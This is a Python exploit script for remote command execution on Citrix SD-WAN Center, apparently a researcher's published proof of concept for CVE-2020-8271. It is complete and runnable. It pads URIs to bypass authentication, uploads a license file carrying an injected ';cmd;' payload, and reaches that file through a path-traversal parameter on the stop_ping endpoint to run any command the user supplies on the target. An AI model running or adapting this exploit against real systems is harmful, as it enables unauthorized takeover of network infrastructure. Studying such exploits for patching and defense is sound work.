"""
    Citrix SD-WAN Center RCE
    By Ariel Tempelhof of Realmode Labs
    Part of SD-PWN
    Using the following CVE:
        CVE-2020-8271
    Other CVEs you should check out:
        CVE-2020-8272
        CVE-2020-8273
"""

import requests
import argparse


class CitrixSDWANClient:
    def __init__(self, host):
        self.host = host
        self.filename = "test"
        self.s = requests.session()
        self.s.verify = False

    def _pad_uri(self, uri):
        padding_len = len(self.host) - 1
        uri = "/://?".rjust(padding_len, "a") + uri
        return uri

    def _send_request(self, uri, **kwargs):
        uri = self._pad_uri(uri)

        res = self.s.post(f"{self.host}/{uri}", allow_redirects=False, **kwargs)
        print(res.status_code)
        print(res.text)

    def upload_license(self, cmd):
        data = {"name": self.filename}
        files = {"file": (self.filename, f";{cmd};")}

        self._send_request("/collector/licensing/upload", data=data, files=files)

    def stop_ping_injection(self):
        data = {"reqId": f"/../../home/talariuser/uploaded_license_files/{self.filename}"}

        self._send_request("/collector/diagnostics/stop_ping", data=data)


def parse_args():
    parser = argparse.ArgumentParser(description='Citrix SD-WAN Center RCE Exploit')
    parser.add_argument('host', help='Full HTTPS Host')
    parser.add_argument('cmd', help="command to run")

    args = parser.parse_args()

    return args


def main():

    args = parse_args()

    cscc = CitrixSDWANClient(args.host)
    cscc.upload_license(args.cmd)
    cscc.stop_ping_injection()


if __name__ == "__main__":
    main()
